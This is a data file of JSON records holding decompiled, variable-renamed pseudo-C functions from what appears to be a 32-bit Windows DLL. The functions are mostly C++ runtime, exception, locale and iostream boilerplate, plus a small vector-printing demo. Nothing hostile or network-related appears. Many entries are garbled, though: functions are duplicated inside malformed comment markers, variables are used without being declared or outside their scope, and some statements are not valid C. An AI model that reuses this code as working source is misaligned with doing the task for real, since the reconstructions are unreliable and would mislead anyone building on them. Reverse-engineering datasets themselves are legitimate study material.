{"Function Name": "FUN_10039060", "Address": "10039060", "Source Code": "void FUN_10039060(void)\n{\n    PVOID *voidPointerPtr; \n    PVOID voidPtr; \n    uint xorResult; \n    int *intPtrStart; \n    int *intPtrCurrent; \n    \n    xorResult = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    ExceptionList = &ExceptionList; \n    \n    if (DAT_1004ea70 != 0) {\n        intPtrStart = (int *)PTR_DAT_1004ea7c; \n        intPtrCurrent = (int *)PTR_PTR_1004ea78; \n        \n        if (PTR_PTR_1004ea78 < PTR_DAT_1004ea7c) {\n            do {\n                \n                if (*intPtrCurrent != 0) {\n                    voidPointerPtr = *(PVOID **)(*intPtrCurrent + 0x10); \n                    voidPtr = *voidPointerPtr; \n                    \n                    if (voidPtr != (PVOID)0x0) {\n                        intPtrStart = (int *)DecodePointer(voidPtr); \n                        \n                        (**(code **)(*intPtrStart + 8))(intPtrStart, xorResult);\n                        *voidPointerPtr = (PVOID)0x0; \n                    }\n                }\n                intPtrCurrent = intPtrCurrent + 1; \n            } while (intPtrCurrent < intPtrStart); \n        }\n        \n        DeleteCriticalSection((LPCRITICAL_SECTION)&DAT_1004ea80);\n        DAT_1004ea70 = 0; \n    }\n    return; \n}"}
{"Function Name": "lhpjmall", "Address": "10001560", "Source Code": "char * getStringLiteral(void)\n{\n    \n    return \"sutmggdflrxk\";\n}"}
{"Function Name": "FUN_10001570", "Address": "10001570", "Source Code": "undefined * getUndefinedPointer(void)\n{\n    \n    return globalUndefinedPointer;\n}"}
{"Function Name": "FUN_10001580", "Address": "10001580", "Source Code": "int __cdecl\nFUN_10001580(char *param_1, uint param_2, char *param_3, __crt_locale_pointers *param_4, char *param_5)\n{\n    \n    undefined4 *puVar1 = (undefined4 *)FUN_10001570();\n    \n    \n    int iVar2 = ___stdio_common_vsprintf_s(*puVar1, puVar1[1], param_1, param_2, param_3, param_4, param_5);\n    \n    \n    return (iVar2 < 0) ? -1 : iVar2;\n}"}
{"Function Name": "FUN_100015e0", "Address": "100015e0", "Source Code": "void __thiscall FUN_100015e0(void *object, char *input_string)\n{\n    \n    *(undefined ***)object = std::exception::vftable;\n    \n    *(undefined8 *)((int)object + 4) = 0;\n    \n    ___std_exception_copy(&input_string, (char **)(undefined8 *)((int)object + 4));\n    \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack_frame);\n    \n    return;\n}"}
{"Function Name": "FUN_10001660", "Address": "10001660", "Source Code": "char * __fastcall get_exception_message(int input_address)\n{\n    \n    return *(char **)(input_address + 4) != (char *)0x0 ? \n        \n        *(char **)(input_address + 4) : \n        \n        \"Unknown exception\";\n}"}
{"Function Name": "FUN_100016a0", "Address": "100016a0", "Source Code": "void __thiscall FUN_100016a0(void *object_pointer, char *input_string)\n{\n    \n    *(undefined ***)object_pointer = std::exception::vftable;\n    \n    *(undefined8 *)((int)object_pointer + 4) = 0;\n    \n    ___std_exception_copy(&input_string, (char **)(undefined8 *)((int)object_pointer + 4));\n    \n    *(undefined ***)object_pointer = std::runtime_error::vftable;\n    \n    ___security_check_cookie_4(DAT_1004e008 ^ (uint)&stack0xfffffffc);\n    \n    \n    return;\n}"}
{"Function Name": "FUN_10001720", "Address": "10001720", "Source Code": "\\*\nundefined4 * __fastcall FUN_10001720(undefined4 *arrayPointer)\n{\n    \n    arrayPointer[1] = \"bad cast\";\n    \n    \n    *arrayPointer = std::bad_cast::vftable;\n    \n    \n    return arrayPointer;\n}\n*\\ \n \nundefined4 * __fastcall FUN_10001720(undefined4 *arrayPointer)\n{\n    arrayPointer[1] = \"bad cast\";\n    *arrayPointer = std::bad_cast::vftable;\n    return arrayPointer;\n}"}
{"Function Name": "FUN_10001740", "Address": "10001740", "Source Code": "\\*\n_Lockit * __thiscall FUN_10001740(void *context, char *locale_name)\n{\n    code *function_pointer; \n    _Lockit *lockit_instance; \n    int error_info[3]; \n    error_info[0] = 0; \n    error_info[1] = 0; \n    error_info[2] = 0; \n    \n    std::_Lockit::_Lockit((_Lockit *)context, 0);\n    \n    \n    *(undefined4 *)((int)context + 4) = 0; \n    *(undefined *)((int)context + 8) = 0; \n    *(undefined4 *)((int)context + 0xc) = 0; \n    *(undefined *)((int)context + 0x10) = 0; \n    *(undefined4 *)((int)context + 0x14) = 0; \n    *(undefined2 *)((int)context + 0x18) = 0; \n    *(undefined4 *)((int)context + 0x1c) = 0; \n    *(undefined2 *)((int)context + 0x20) = 0; \n    *(undefined4 *)((int)context + 0x24) = 0; \n    *(undefined *)((int)context + 0x28) = 0; \n    *(undefined4 *)((int)context + 0x2c) = 0; \n    *(undefined *)((int)context + 0x30) = 0; \n    \n    if (locale_name != (char *)0x0) {\n        \n        std::_Locinfo::_Locinfo_ctor((_Locinfo *)context, locale_name);\n        return (_Lockit *)context; \n    }\n    \n    FUN_100016a0(error_info, \"bad locale name\"); \n    __CxxThrowException_8(error_info, &DAT_1004c6ac); \n    function_pointer = (code *)swi(3); \n    lockit_instance = (_Lockit *)(*function_pointer)(); \n    return lockit_instance; \n}\n*\\ \n \n_Lockit * __thiscall FUN_10001740(void *context,char *locale_name)\n{\ncode *function_pointer;\n_Lockit *lockit_instance;\nint error_info[3];\nerror_info[0] = 0;\nerror_info[1] = 0;\nerror_info[2] = 0;\nstd::_Lockit::_Lockit((_Lockit *)context, 0);\n*(undefined4 *)((int)context + 4) = 0;\n*(undefined *)((int)context + 8) = 0;\n*(undefined4 *)((int)context + 0xc) = 0;\n*(undefined *)((int)context + 0x10) = 0;\n*(undefined4 *)((int)context + 0x14) = 0;\n*(undefined2 *)((int)context + 0x18) = 0;\n*(undefined4 *)((int)context + 0x1c) = 0;\n*(undefined2 *)((int)context + 0x20) = 0;\n*(undefined4 *)((int)context + 0x24) = 0;\n*(undefined *)((int)context + 0x28) = 0;\n*(undefined4 *)((int)context + 0x2c) = 0;\n*(undefined *)((int)context + 0x30) = 0;\nif (locale_name != (char *)0x0) {\n    std::_Locinfo::_Locinfo_ctor((_Locinfo *)context, locale_name);\n    return (_Lockit *)context;\n}\nFUN_100016a0(error_info, \"bad locale name\");\n__CxxThrowException_8(error_info, &DAT_1004c6ac);\nfunction_pointer = (code *)swi(3);\nlockit_instance = (_Lockit *)(*function_pointer)();\nreturn lockit_instance;\n}"}
{"Function Name": "std::_Facet_base::`scalar_deleting_destructor'", "Address": "10001910", "Source Code": "void * __thiscall std::facetBase::_scalar_deleting_destructor_(_Facet_base *currentObject, uint parameter)\n{\n    \n    *(undefined ***)currentObject = vftable;\n    \n    if (parameter & 1) {\n        \n        FUN_10013ceb(currentObject);\n    }\n    \n    return currentObject;\n}"}
{"Function Name": "FUN_10001990", "Address": "10001990", "Source Code": "void __fastcall FUN_10001990(int input_param)\n{\n    acquire_lock(); \n    *(int *)(input_param + 4) += 1; \n    release_lock(); \n}"}
{"Function Name": "FUN_100019a0", "Address": "100019a0", "Source Code": "int __fastcall FUN_100019a0(int input_address)\n{\n    int decremented_value; \n    LOCK(); \n    decremented_value = *(int *)(input_address + 4) - 1; \n    *(int *)(input_address + 4) = decremented_value; \n    UNLOCK(); \n    return (decremented_value == 0) ? input_address : 0; \n}"}
{"Function Name": "FUN_100019c0", "Address": "100019c0", "Source Code": "void __fastcall FUN_100019c0(undefined4 *facet_base_pointer) \n{\n    *facet_base_pointer = std::_Facet_base::vftable; \n}"}
{"Function Name": "FUN_10001a80", "Address": "10001a80", "Source Code": "void __thiscall FUN_10001a80(void *object, byte inputByte)\n{\n    \n    \n    __Tolower((uint)inputByte, (_Ctypevec *)((int)object + 8));\n}"}
{"Function Name": "FUN_10001af0", "Address": "10001af0", "Source Code": "void __thiscall FUN_10001af0(void *context, byte inputByte)\n{\n    \n    \n    __Toupper((uint)inputByte, (_Ctypevec *)((int)context + 8));\n}"}
{"Function Name": "FUN_10001b60", "Address": "10001b60", "Source Code": "undefined FUN_10001b60(undefined input_value)\n{\n    \n    return input_value;\n}"}
{"Function Name": "FUN_10001ba0", "Address": "10001ba0", "Source Code": "undefined FUN_10001ba0(undefined input_param)\n{\n    \n    return input_param;\n}"}
{"Function Name": "std::ctype<char>::`scalar_deleting_destructor'", "Address": "10001be0", "Source Code": "void * __thiscall std::ctype<char>::_scalar_deleting_destructor_(ctype<char> *current_object, uint reference_count)\n{\n    \n    *(undefined ***)current_object = virtual_function_table;\n    \n    if (*(int *)(current_object + 0x10) < 1) {\n        \n        if (*(int *)(current_object + 0x10) < 0) {\n            thunk_function(*(void **)(current_object + 0xc));\n        }\n    } else {\n        \n        function_call(*(void **)(current_object + 0xc));\n    }\n    \n    function_call(*(void **)(current_object + 0x14));\n    \n    *(undefined ***)current_object = _Facet_base::virtual_function_table;\n    \n    if (reference_count & 1) {\n        FUN_10013ceb(current_object);\n    }\n    \n    return current_object;\n}"}
{"Function Name": "std::error_category::equivalent", "Address": "10001c60", "Source Code": "bool __thiscall\nstd::error_category::equivalent(error_category *this, int param_1, error_condition *param_2)\n{\n    int *piVar1; \n    \n    piVar1 = (int *)(**(code **)(*(int *)this + 0xc))(nullptr, param_1);\n    \n    return (*(int *)(piVar1[1] + 4) == *(int *)(*(int *)(param_2 + 4) + 4)) && (*piVar1 == *(int *)param_2);\n}"}
{"Function Name": "std::error_category::equivalent", "Address": "10001ca0", "Source Code": "bool __thiscall\nstd::error_category::equivalent(error_category *this, error_code *param_1, int param_2)\n{\n    \n    \n    \n    return (*(int *)(this + 4) == *(int *)(*(int *)(param_1 + 4) + 4)) && \n           \n           (*(int *)param_1 == param_2);\n}"}
{"Function Name": "FUN_10001d10", "Address": "10001d10", "Source Code": "void FUN_10001d10(undefined4 param_1, undefined8 *param_2, undefined8 *param_3)\n{\n    uint calculatedValue; \n    uint valueFromParam3; \n    uint xorWithStackAddress; \n    uint adjustedSize; \n    int memoryAllocationReturnValue; \n    undefined8 *localMemoryPointer; \n    undefined8 *param3Pointer; \n    uint sizeTrackingLocal; \n    uint stackSizeTracking; \n    undefined *stackAlignmentPointer; \n    void *exceptionListPointer; \n    undefined4 statusTrackingLocal; \n    stackAlignmentPointer = &stack0xfffffffc; \n    statusTrackingLocal = 0xffffffff; \n    exceptionListPointer = currentExceptionList; \n    xorWithStackAddress = securityCheckValue ^ (uint)&stack0xfffffff0; \n    currentExceptionList = &exceptionListPointer; \n    param3Pointer = param_3; \n    sizeTrackingLocal = 0; \n    valueFromParam3 = *(uint *)(param_3 + 2); \n    stackSizeTracking = 0; \n    \n    if (0xf < *(uint *)((int)param_3 + 0x14)) {\n        param3Pointer = *(undefined8 **)param_3; \n    }\n    \n    \n    if (0xf < valueFromParam3) {\n        adjustedSize = valueFromParam3 | 0xf; \n        if (0x7fffffff < adjustedSize) {\n            adjustedSize = 0x7fffffff; \n        }\n        calculatedValue = adjustedSize + 1; \n        \n        if (calculatedValue < 0x1000) {\n            if (calculatedValue == 0) {\n                localMemoryPointer = (undefined8 *)0x0; \n            } else {\n                localMemoryPointer = (undefined8 *)memoryAllocationFunction(calculatedValue); \n            }\n            functionCallWithMemory(localMemoryPointer, param3Pointer, valueFromParam3 + 1); \n            stackSizeTracking = adjustedSize; \n            goto LAB_10001dfd; \n        }\n        uint uVar8 = adjustedSize + 0x24; \n        if (uVar8 <= calculatedValue) {\n            uVar8 = 0xffffffff; \n        }\n        memoryAllocationReturnValue = memoryAllocationFunction(uVar8); \n        if (memoryAllocationReturnValue != 0) {\n            localMemoryPointer = (undefined8 *)(memoryAllocationReturnValue + 0x23U & 0xffffffe0); \n            *(int *)((int)localMemoryPointer - 4) = memoryAllocationReturnValue; \n            goto LAB_10001de7; \n        }\n        allocationFailureHandler(); \n        goto LAB_10001fc1; \n    }\nLAB_10001dfd:\n    \n    if (valueFromParam3 != 0) {\n        \n        if (stackSizeTracking - valueFromParam3 < 2) {\n            smallBufferAllocationFunction(&localMemoryPointer, 2, local_54, (undefined8 *)&DAT_10047910, 2); \n        } else {\n            sizeTrackingLocal = valueFromParam3 + 2; \n            undefined8 *puVar10 = (0xf < stackSizeTracking) ? localMemoryPointer : (undefined8 *)&localMemoryPointer; \n            dataCopyFunction((undefined8 *)(valueFromParam3 + (int)puVar10), (undefined8 *)&DAT_10047910, 2); \n            *(undefined *)((int)(undefined8 *)(valueFromParam3 + (int)puVar10) + 2) = 0; \n        }\n    }\n    \n    (**(code **)(*(int *)param3Pointer + 8))(&localVariable6c, param_1, xorWithStackAddress);\n    statusTrackingLocal = CONCAT31(statusTrackingLocal._1_3_, 1); \n    undefined8 *puVar11 = (0xf < localVariable58) ? localVariable6c : (undefined8 *)&localVariable6c; \n    \n    if (stackSizeTracking - sizeTrackingLocal < localVariable5c) {\n        sizeTrackingLocal = sizeTrackingLocal & 0xffffff00; \n        smallBufferAllocationFunction(&localMemoryPointer, localVariable5c, sizeTrackingLocal, puVar11, localVariable5c); \n    } else {\n        undefined8 *puVar12 = (0xf < stackSizeTracking) ? localMemoryPointer : (undefined8 *)&localMemoryPointer; \n        undefined8 *puVar3 = (undefined8 *)((int)puVar12 + sizeTrackingLocal); \n        sizeTrackingLocal += localVariable5c; \n        dataCopyFunction(puVar3, puVar11, localVariable5c); \n        *(undefined *)((int)puVar12 + sizeTrackingLocal + localVariable5c) = 0; \n    }\n    \n    if (0xf < localVariable58) {\n        \n        if ((0xfff < localVariable58 + 1) && (puVar10 = *(undefined8 **)((int)localVariable6c + -4), 0x1f < (uint)((int)localVariable6c + (-4 - (int)puVar10)))) {\n            allocationFailureHandler(); \n        }\n        cleanupMemoryFunction(puVar10); \n    }\n    undefined4 *puVar6 = exceptionHandlingPointer; \n    *exceptionHandlingPointer = std::exception::vftable; \n    *(undefined8 *)(exceptionHandlingPointer + 1) = 0; \n    localPointer = (undefined8 *)&local_84; \n    if (0xf < stackSizeTracking) {\n        localPointer = localMemoryPointer; \n    }\n    sizeTrackingLocal = 0; \n    char **ppcVar2 = (char **)(exceptionHandlingPointer + 1); \n    stackSizeTracking = 0xf; \n    localMemoryPointer = (undefined8 *)((uint)localMemoryPointer & 0xffffff00); \n    exceptionDataCopyFunction((char **)&localPointer, ppcVar2); \n    *puVar6 = std::runtime_error::vftable; \n    \n    if (0xf < localVariable74._4_4_) {\n        \n        if ((0xfff < localVariable74._4_4_ + 1) && (puVar10 = *(undefined8 **)((int)local_84 + -4), 0x1f < (uint)((int)local_84 + (-4 - (int)puVar10)))) {\n            allocationFailureHandler(); \n        }\n        cleanupMemoryFunction(puVar10); \n    }\n    puVar6[3] = param_1; \n    *puVar6 = std::_System_error::vftable; \n    puVar6[4] = param_2; \n    currentExceptionList = exceptionListPointer; \n    securityCheckFunction(local_24 ^ (uint)&stack0xfffffff0); \n    return; \n}"}
{"Function Name": "FUN_10002000", "Address": "10002000", "Source Code": "char * getStringLiteral(void)\n{\n    \n    return \"iostream\";\n}"}
{"Function Name": "FUN_10002090", "Address": "10002090", "Source Code": "void * __thiscall FUN_10002090(void *objectPointer, byte flag)\n{\n    \n    if (flag & 1) {\n        \n        FUN_10013ceb(objectPointer);\n    }\n    \n    return objectPointer;\n}"}
{"Function Name": "FUN_100020b0", "Address": "100020b0", "Source Code": "\\*\nundefined4 * __thiscall FUN_100020b0(void *objectPointer, undefined8 *inputParam, undefined4 *inputArray)\n{\n    undefined4 firstElement; \n    undefined8 *secondElement; \n    void *memoryPointer; \n    void *localCounter = (void *)0; \n    firstElement = *inputArray; \n    secondElement = (undefined8 *)inputArray[1]; \n    do {\n        localCounter = (void *)((uint)localCounter + 1); \n    } while (*(char *)((undefined8 *)inputParam + (uint)localCounter) != '\\0'); \n    FUN_10004010(&localCounter, inputParam, (void *)((int)inputParam + (uint)localCounter)); \n    FUN_10001d10(firstElement, secondElement, (undefined8 *)&localCounter); \n    if ((uint)localCounter > 0xf) { \n        memoryPointer = localCounter; \n        if ((uint)localCounter > 0xfff) { \n            memoryPointer = *(void **)((int)localCounter + -4); \n            if ((uint)((int)localCounter + (-4 - (int)memoryPointer)) > 0x1f) { \n                FUN_1001dea6(); \n                (code *)swi(3)(); \n                return (undefined4 *)(*pcVar4)(); \n            }\n        }\n        FUN_10013ceb(memoryPointer); \n    }\n    *(undefined ***)objectPointer = std::ios_base::failure::vftable; \n    return (undefined4 *)objectPointer; \n}\n*\\ \n \nundefined4 * __thiscall FUN_100020b0(void *objectPointer, undefined8 *inputParam, undefined4 *inputArray)\n{\n    undefined4 firstElement;\n    undefined8 *secondElement;\n    void *memoryPointer;\n    void *localCounter = (void *)0;\n    firstElement = *inputArray;\n    secondElement = (undefined8 *)inputArray[1];\n    do {\n        localCounter = (void *)((uint)localCounter + 1);\n    } while (*(char *)((undefined8 *)inputParam + (uint)localCounter) != '\\0');\n    FUN_10004010(&localCounter, inputParam, (void *)((int)inputParam + (uint)localCounter));\n    FUN_10001d10(firstElement, secondElement, (undefined8 *)&localCounter);\n    if ((uint)localCounter > 0xf) {\n        memoryPointer = localCounter;\n        if ((uint)localCounter > 0xfff) {\n            memoryPointer = *(void **)((int)localCounter + -4);\n            if ((uint)((int)localCounter + (-4 - (int)memoryPointer)) > 0x1f) {\n                FUN_1001dea6();\n                (code *)swi(3)();\n                return (undefined4 *)(*pcVar4)();\n            }\n        }\n        FUN_10013ceb(memoryPointer);\n    }\n    *(undefined ***)objectPointer = std::ios_base::failure::vftable;\n    return (undefined4 *)objectPointer;\n}"}
{"Function Name": "FUN_10002180", "Address": "10002180", "Source Code": "void __thiscall FUN_10002180(void *this, uint inputState, char throwFlag)\n{\n    uint maskedState; \n    char *errorMessage; \n    \n    *(uint *)((int)this + 0xc) = inputState & 0x17;\n    \n    maskedState = *(uint *)((int)this + 0x10) & inputState & 0x17;\n    \n    if (maskedState != 0) {\n        \n        if (throwFlag != '\\0') {\n            __CxxThrowException_8((int *)0x0, (byte *)0x0);\n        }\n        \n        if ((maskedState & 4) == 0) {\n            \n            errorMessage = (maskedState & 2) == 0 ? \"ios_base::eofbit set\" : \"ios_base::failbit set\";\n        } else {\n            \n            errorMessage = \"ios_base::badbit set\";\n        }\n        \n        undefined4 *errorHandler = (undefined4 *)FUN_10001cd0(NULL, 1);\n        FUN_100020b0(NULL, (undefined8 *)errorMessage, errorHandler);\n        \n        __CxxThrowException_8(NULL, &DAT_1004c658);\n        \n        ((code *)swi(3))();\n    }\n}"}
{"Function Name": "FUN_100022f0", "Address": "100022f0", "Source Code": "void FUN_100022f0(void)\n{\n    code *function_pointer; \n    undefined8 *undefined_pointer_8_1; \n    int *integer_pointer; \n    undefined8 *iterator_pointer_1; \n    undefined8 *iterator_pointer_2; \n    int loop_index; \n    undefined8 data_storage; \n    undefined8 *storage_pointer; \n    void *original_exception_list; \n    uint security_cookie; \n    original_exception_list = ExceptionList; \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &original_exception_list; \n    iterator_pointer_1 = (undefined8 *)0x0; \n    iterator_pointer_2 = (undefined8 *)0x0; \n    data_storage = 0; \n    storage_pointer = (undefined8 *)0x0; \n    integer_pointer = FUN_10004550((int *)&DAT_1004fa70,\"vector size = \"); \n    integer_pointer = FUN_100025e0(integer_pointer,0); \n    FUN_10004800(integer_pointer); \n    do {\n        if (iterator_pointer_2 == iterator_pointer_1) { \n            FUN_100048b0(&data_storage, iterator_pointer_1, &storage_pointer); \n            iterator_pointer_1 = data_storage._4_4_; \n            iterator_pointer_2 = (undefined8 *)0x0; \n        } else {\n            *(undefined8 **)iterator_pointer_1 = storage_pointer; \n            data_storage = CONCAT44((undefined8 *)((int)iterator_pointer_1 + 4), (undefined8 *)data_storage); \n            iterator_pointer_1 = (undefined8 *)((int)iterator_pointer_1 + 4); \n        }\n        storage_pointer = (undefined8 *)((int)storage_pointer + 1); \n    } while ((int)storage_pointer < 5); \n    integer_pointer = FUN_10004550((int *)&DAT_1004fa70,\"extended vector size = \"); \n    integer_pointer = FUN_100025e0(integer_pointer, (int)iterator_pointer_1 - (int)(undefined8 *)data_storage >> 2); \n    FUN_10004800(integer_pointer); \n    loop_index = 0; \n    do {\n        integer_pointer = FUN_10004550((int *)&DAT_1004fa70,\"value of vec [\"); \n        integer_pointer = FUN_10002780(integer_pointer, loop_index); \n        integer_pointer = FUN_10004550(integer_pointer,\"] = \"); \n        integer_pointer = FUN_10002780(integer_pointer, *(undefined4 *)((int)iterator_pointer_2 + loop_index * 4)); \n        FUN_10004800(integer_pointer); \n        loop_index++; \n    } while (loop_index < 5); \n    for (; iterator_pointer_2 != iterator_pointer_1; iterator_pointer_2 = (undefined8 *)((int)iterator_pointer_2 + 4)) { \n        integer_pointer = FUN_10004550((int *)&DAT_1004fa70,\"value of v = \"); \n        integer_pointer = FUN_10002780(integer_pointer, *(undefined4 *)iterator_pointer_2); \n        FUN_10004800(integer_pointer); \n    }\n    if ((undefined8 *)data_storage != (undefined8 *)0x0) { \n        void *temp_pointer = (undefined8 *)data_storage; \n        if ((0xfff < ((int)undefined_pointer_8_1 - (int)(undefined8 *)data_storage & 0xfffffffcU)) && \n            (temp_pointer = *(void **)((int)(undefined8 *)data_storage + -4), \n            0x1f < (uint)((int)(undefined8 *)data_storage + (-4 - (int)temp_pointer)))) { \n            FUN_1001dea6(); \n            function_pointer = (code *)swi(3); \n            (*function_pointer)(); \n            return; \n        }\n        FUN_10013ceb(temp_pointer); \n    }\n    ExceptionList = original_exception_list; \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_10002590", "Address": "10002590", "Source Code": "void __fastcall FUN_10002590(void **inputArray)\n{\n    void *firstElement = *inputArray; \n    if ((void *)0xf < inputArray[5]) { \n        if ((0xfff < (int)inputArray[5] + 1U) && \n            (firstElement = *(void **)((int)firstElement - 4), 0x1f < (uint)((int)inputArray[0] - (int)firstElement))) { \n            functionA(); \n            ((code *)swi(3))(); \n            return; \n        }\n        functionB(firstElement); \n    }\n    inputArray[4] = (void *)0x0; \n    inputArray[5] = (void *)0xf; \n    *(undefined *)inputArray = 0; \n    return; \n}"}
{"Function Name": "FUN_100025e0", "Address": "100025e0", "Source Code": "int * __thiscall FUN_100025e0(void *this, undefined4 param_1)\n{\n    int *integerPointer; \n    uint *unsignedIntPointer; \n    undefined4 *undefinedPointer; \n    int integerValue; \n    uint unsignedIntValue; \n    void *tempPointer; \n    uint localArray[2]; \n    undefined localUndefined; \n    \n    localUndefined = 0xffffffff; \n    tempPointer = ExceptionList; \n    ExceptionList = &localUndefined; \n    integerValue = *this; \n    integerPointer = *(int **)(*(int *)(integerValue + 4) + 0x38 + (int)this); \n    \n    if (integerPointer != (int *)0x0) { \n        (**(code **)(*integerPointer + 4))(); \n    }\n    \n    if ((*(int *)(*(int *)(integerValue + 4) + 0xc + (int)this) == 0) && \n        (integerPointer = *(int **)(*(int *)(integerValue + 4) + 0x3c + (int)this), integerPointer != (int *)0x0) && \n        (integerPointer != (int *)this)) { \n        FUN_100041d0(integerPointer); \n    }\n    \n    if (*(int *)(*(int *)(integerValue + 4) + 0xc + (int)this) == 0) { \n        localUndefined._0_1_ = 2; \n        localUndefined._1_3_ = 0; \n        unsignedIntPointer = *(uint **)(*(int *)(*(int *)(integerValue + 4) + 0x30 + (int)this) + 4); \n        (**(code **)(*unsignedIntPointer + 4))(); \n        localUndefined._0_1_ = 3; \n        integerPointer = (int *)FUN_10004a30(&localArray[0]); \n        localUndefined._0_1_ = 4; \n        \n        if ((unsignedIntPointer != (int *)0x0) && \n            (undefinedPointer = (undefined4 *)(**(code **)(*unsignedIntPointer + 8))(), undefinedPointer != (undefined4 *)0x0)) { \n            (**(code **)*undefinedPointer)(1); \n        }\n        \n        localUndefined = CONCAT31(localUndefined._1_3_, 5); \n        integerValue = *(int *)(*this + 4) + (int)this; \n        localArray[0] = localArray[0] & 0xffffff00; \n        (**(code **)(*integerPointer + 0x20))(localArray, localArray[0], *(undefined4 *)(integerValue + 0x38), integerValue, unsignedIntPointer, param_1); \n    }\n    \n    tempPointer = (void *)(*(int *)(*this + 4) + (int)this); \n    unsignedIntValue = *(uint *)((int)tempPointer + 0xc) | 4; \n    \n    if (*(int *)((int)tempPointer + 0x38) != 0) { \n        unsignedIntValue = *(uint *)((int)tempPointer + 0xc); \n    }\n    \n    FUN_10002180(tempPointer, unsignedIntValue, '\\0'); \n    localUndefined = 7; \n    \n    if (!___uncaught_exception()) { \n        FUN_100042a0((int *)this); \n    }\n    \n    localUndefined = CONCAT31(localUndefined._1_3_, 8); \n    integerPointer = *(int **)(*(int *)(*this + 4) + 0x38 + (int)this); \n    \n    if (integerPointer != (int *)0x0) { \n        (**(code **)(*integerPointer + 8))(); \n    }\n    \n    ExceptionList = tempPointer; \n    return (int *)this; \n}"}
{"Function Name": "Catch_All@100026f3", "Address": "100026f3", "Source Code": "undefined * Catch_All_100026f3(void) \n{\n    \n    function_call((void *)(*(int *)(**(int **)(base_pointer + -0x14) + 4) + (int)*(int **)(base_pointer + -0x14)), 4, '\\x01');\n    \n    \n    return &global_variable;\n}"}
{"Function Name": "FUN_10002712", "Address": "10002712", "Source Code": "void FUN_10002712(void)\n{\n    void *current_object; \n    uint computed_value; \n    int *unspecified_integer_pointer; \n    uint unspecified_unsigned_integer; \n    *(undefined4 *)(unaff_EBP + -4) = 1; \n    current_object = (void *)(*(int *)(*unspecified_integer_pointer + 4) + (int)unspecified_integer_pointer); \n    computed_value = (*(uint *)((int)current_object + 0xc) | unspecified_unsigned_integer) | 4; \n    if (*(int *)((int)current_object + 0x38) != 0) { \n        computed_value = (*(uint *)((int)current_object + 0xc) | unspecified_unsigned_integer); \n    }\n    \n    FUN_10002180(current_object, computed_value, '\\0'); \n    *(undefined4 *)(unaff_EBP + -4) = 7; \n    if (!___uncaught_exception()) { \n        FUN_100042a0(unspecified_integer_pointer); \n    }\n    *(undefined *)(unaff_EBP + -4) = 8; \n    int *retrieved_pointer = *(int **)(*(int *)(*unspecified_integer_pointer + 4) + 0x38 + (int)unspecified_integer_pointer); \n    \n    if (retrieved_pointer != (int *)0x0) { \n        (**(code **)(*retrieved_pointer + 8))(); \n    }\n    exception_list = *(void **)(unaff_EBP + -0xc); \n    return; \n}"}
{"Function Name": "FUN_10002780", "Address": "10002780", "Source Code": "int * __thiscall FUN_10002780(void *this, undefined4 param_1)\n{\n    uint *unsignedIntPtr; \n    int integerValue; \n    int *integerPtr; \n    uint unsignedIntValue; \n    void *modifiedThisPtr; \n    uint localValue28; \n    int *localIntegerPtr; \n    undefined4 localValue8; \n    localValue8 = 0xffffffff; \n    exceptionList = &localValue8; \n    integerValue = *this; \n    integerPtr = *(int **)(*(int *)(integerValue + 4) + 0x38 + (int)this); \n    if (integerPtr != (int *)0x0) { \n        (**(code **)(*integerPtr + 4))(); \n    }\n    \n    if ((*(int *)(*(int *)(integerValue + 4) + 0xc + (int)this) == 0) && \n        (integerPtr = *(int **)(*(int *)(integerValue + 4) + 0x3c + (int)this), \n        integerPtr != (int *)0x0 && integerPtr != (int *)this)) { \n        FUN_100041d0(integerPtr); \n    }\n    \n    localValue8 = 1; \n    if (*(int *)(*(int *)(integerValue + 4) + 0xc + (int)this) == 0) { \n        localIntegerPtr = *(int **)(*(int *)(*(int *)(integerValue + 4) + 0x30 + (int)this) + 4); \n        (**(code **)(*localIntegerPtr + 4))(); \n        localValue8 = 4; \n        \n        if ((localIntegerPtr != (int *)0x0) && \n            (undefined4 *undefinedPtr = (undefined4 *)(**(code **)(*localIntegerPtr + 8))(), \n            undefinedPtr != (undefined4 *)0x0)) { \n            (**(code **)*undefinedPtr)(1); \n        }\n        \n        integerPtr = (int *)FUN_10004a30((int *)&localValue28); \n        integerValue = *(int *)(*this + 4) + (int)this; \n        localValue28 = localValue28 & 0xffffff00; \n        (**(code **)(*integerPtr + 0x24)) \n        (&localValue28, localValue28, *(undefined4 *)(integerValue + 0x38), integerValue, integerPtr, param_1);\n        integerPtr = (int *)FUN_100028b4(); \n        return integerPtr; \n    }\n    \n    modifiedThisPtr = (void *)(*(int *)(*this + 4) + (int)this); \n    unsignedIntValue = *(uint *)((int)modifiedThisPtr + 0xc) | 4; \n    if (*(int *)((int)modifiedThisPtr + 0x38) != 0) { \n        unsignedIntValue = *(uint *)((int)modifiedThisPtr + 0xc); \n    }\n    \n    FUN_10002180(modifiedThisPtr, unsignedIntValue, '\\0'); \n    localValue8 = 7; \n    \n    if (!___uncaught_exception()) { \n        FUN_100042a0((int *)this); \n    }\n    \n    integerPtr = *(int **)(*(int *)(*this + 4) + 0x38 + (int)this); \n    if (integerPtr != (int *)0x0) { \n        (**(code **)(*integerPtr + 8))(); \n    }\n    \n    return (int *)this; \n}"}
{"Function Name": "Catch_All@10002895", "Address": "10002895", "Source Code": "undefined * Catch_All_10002895(void) \n{\n    \n    function_call(\n        (void *)(*(int *)(**(int **)(base_pointer + -0x18) + 4) + (int)*(int **)(base_pointer + -0x18)), \n        4, \n        '\\x01' \n    );\n    \n    return &data_location; \n}"}
